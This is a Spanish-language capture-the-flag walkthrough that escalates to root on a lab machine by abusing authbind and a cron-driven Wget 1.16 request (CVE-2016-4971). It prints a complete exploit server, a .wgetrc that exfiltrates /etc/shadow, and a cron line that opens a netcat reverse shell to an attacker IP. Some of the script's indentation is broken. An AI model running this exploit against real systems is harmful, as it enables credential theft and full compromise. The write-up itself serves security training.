## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
cat flag.txt
```

Hemos podido entrar en el repertorio root pero la flag no es la buena. Hay un fichero app.log y vemos que hay una tarea
que parece que se lanza cada 2 minutos y que nos hace un GET desde la maquina 10.0.3.133 a la maquina victima.

Intentamos ponernos en escucha al puerto 80 con ncat pero tenemos un Permission denied. Miramos si la utilidad authbind esta installada porque
authbind es un binario que permite a un usuario con bajos privilegios de ponerse en escucha por un puerto definido.

```bash
which authbind
ls -la /etc/authbind/byport
```

Aqui vemos que hay dos puertos el 21 y el 80.

```bash
authbind nc -nlvp 80
```

Ya vemos que la tarea sigue siendo ejecutada y vemos que la maquina 10.0.3.133 utiliza una version de Wget que esta desactualizada.

Miramos si existe un exploit para esta version

```bash
searchsploit wget 1.16
```

y vemos que hay un Arbitrary File Upload / Remote Code Execution.

```bash
searchsploit -x 40064
```

Seguimos por pasos la explicacion del exploit

1. creamos un fichero .wgetrc y le insertamos

    ```bash
    cat <<_EOF_>.wgetrc
    post_file = /etc/shadow
    output_document = /etc/cron.d/wget-root-shell
    _EOF_
    ```

1. creamos un script en python 

    ```python
    #!/usr/bin/env python

    #
    # Wget 1.18 < Arbitrary File Upload Exploit
    # Dawid Golunski
    # dawid( at )legalhackers.com
    #
    # http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
    #
    # CVE-2016-4971
    #

    import SimpleHTTPServer
    import SocketServer
    import socket;

    class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        # This takes care of sending .wgetrc

        print "We have a volunteer requesting " + self.path + " by GET :)\n"
        if "Wget" not in self.headers.getheader('User-Agent'):
        print "But it's not a Wget :( \n"
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Nothing to see here...")
            return

        print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
        self.send_response(301)
        new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
        print "Sending redirect to %s \n"%(new_path)
        self.send_header('Location', new_path)
        self.end_headers()

    def do_POST(self):
        # In here we will receive extracted file and install a PoC cronjob

        print "We have a volunteer requesting " + self.path + " by POST :)\n"
        if "Wget" not in self.headers.getheader('User-Agent'):
        print "But it's not a Wget :( \n"
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Nothing to see here...")
            return

        content_len = int(self.headers.getheader('content-length', 0))
        post_body = self.rfile.read(content_len)
        print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

        print "Sending back a cronjob script as a thank-you for the file..."
        print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(ROOT_CRON)

        print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"

        return

    HTTP_LISTEN_IP = '0.0.0.0'
    HTTP_LISTEN_PORT = 80
    FTP_HOST = '10.10.10.55'
    FTP_PORT = 21

    ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f \n"

    handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

    print "Ready? Is your FTP server running?"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((FTP_HOST, FTP_PORT))
    if result == 0:
    print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
    else:
    print "FTP is down :( Exiting."
    exit(1)

    print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

    handler.serve_forever()
    ```

1. habrimos en una ventana el puerto 21 para el ftp

    ```bash
    authbind python -m pyftpdlib -p21 -w
    ```

1. en la otra ventana lanzamos el exploit

    ```bash
    authbind python wget-exploit.py
    ```

en la maquina de atacante nos ponemos en escucha por el puerto 443 y esperamos que nos entable esta Coneccion.


`whoami` -> root ;)